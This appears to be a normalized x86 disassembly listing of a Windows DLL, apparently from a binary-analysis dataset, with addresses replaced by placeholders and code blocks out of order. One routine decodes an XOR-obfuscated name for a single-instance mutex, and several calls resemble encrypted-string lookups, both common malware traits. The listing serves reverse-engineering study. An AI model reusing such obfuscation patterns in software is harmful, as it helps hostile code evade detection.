mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_100550c4
mov ecx esi
call sub_1005576a
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_1004ff82
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_1000aecf
test edi edi
je r-xdata
mov ecx esi
call sub_1005576a
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_100202c4
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10003a04
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000aecf
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10041a20
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_100202c4
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_1000aecf
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_10023e65
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_10023e65
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_100550c4
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1005576a
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_100550c4
inc [ ebp - 0x17c ]
mov ecx esi
call sub_10023e65
sub_1000cb79
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1000d0ca
push 0x28
mov eax sub_1007f6b0
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
sub_1000d161
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
push esi
mov esi [ edx ]
mov edx 0x100
test esi esi
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
push esi
call sub_10022837
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push edi
pop edi
cmp cx dx
jae r-xdata
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x41 ]
cmp dx 0x19
ja r-xdata
add cx 0x20
movzx eax cx
jmp r-xdata
sub_1000d1d0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
xor edi edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov eax [ ebx ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x13
call sub_100050e0
mov ecx [ esi ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xf0
call sub_100050e0
mov ecx [ esi + 0x8 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi ] edi
lea edx [ ebp - 0x2c ]
mov eax 0x12
call sub_100050e0
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x8 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x8 ] edi
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xa8
call sub_100050e0
mov [ esi + 0x10 ] eax
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0xc ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0xc ] edi
mov ecx [ ebx + 0xc ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xd6
call sub_100050e0
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x10 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x16
call sub_100050e0
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x14 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x82
call sub_100050e0
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x18 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x18 ] edi
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x22
call sub_100050e0
mov [ esi + 0x50 ] eax
inc [ eax + 0x1c ]
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x1c ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x1c ] edi
mov ecx [ ebx + 0x1c ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x56
call sub_100050e0
mov [ ebp - 0x34 ] eax
mov eax [ ebx + 0x54 ]
cmp eax edi
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x28 ]
mov [ esi + 0x28 ] ecx
mov eax [ ebx + 0x50 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x34 ]
xor ecx ebp
mov [ esi + 0x34 ] edx
mov eax esi
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x30 ]
cmp ecx edi
je r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx ]
push eax
lea eax [ esi + 0x54 ]
call sub_10007a30
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
jne r-xdata
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push edi
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_100796a0
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x30 ] edi
mov edx [ ebx + 0x38 ]
mov [ esi + 0x38 ] edx
mov eax [ ebx + 0x40 ]
mov [ esi + 0x40 ] eax
mov ecx [ ebx + 0x44 ]
mov [ esi + 0x44 ] ecx
mov edx [ ebx + 0x48 ]
mov [ esi + 0x48 ] edx
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov ecx [ ebx + 0x2c ]
mov [ esi + 0x2c ] ecx
mov edx [ ebx + 0x24 ]
mov [ esi + 0x24 ] edx
mov eax [ ebx + 0x30 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
sub_1000d540
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff89
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push eax
mov [ ebp - 0x8 ] ax
call [ CreateMutexW@IAT ]
mov [ esi + 0x20 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x46
call sub_100050e0
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x4c ]
mov eax 0xce
mov [ edi ] 0x0
call sub_100050e0
mov edx [ esi + 0x20 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
ja r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x5e
call sub_100050e0
cmp eax 0xffffffff
je r-xdata
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x80
lea edx [ ebp - 0x74 ]
mov eax 0x7e
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x123
jmp r-xdata
test eax eax
je r-xdata
call sub_100050e0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0xbd
call sub_100050e0
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp eax 0x80
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x3f
call sub_100050e0
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1000d680
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x71c71c6
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1002c5ed
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x71c71c7
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1003ccc0
mov eax esi
cmp eax esi
jae r-xdata
sub_1000d6f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000d740
push ebp
mov ebp esp
push 0xffffffff
push sub_10080389
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
push edi
push edi
call [ CoInitializeEx@IAT ]
test eax eax
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
push r--data
push 0x1
push edi
push r--data
mov [ ebp - 0x20 ] edi
call [ CoCreateInstance@IAT ]
cmp eax edi
jge r-xdata
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x4c ]
push ecx
call esi
